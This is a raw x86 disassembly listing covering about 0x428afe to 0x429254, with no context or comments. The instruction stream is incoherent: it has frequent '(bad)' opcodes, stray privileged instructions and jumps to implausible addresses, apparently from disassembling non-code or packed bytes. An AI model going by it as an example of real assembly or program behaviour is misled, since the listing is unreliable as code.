  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
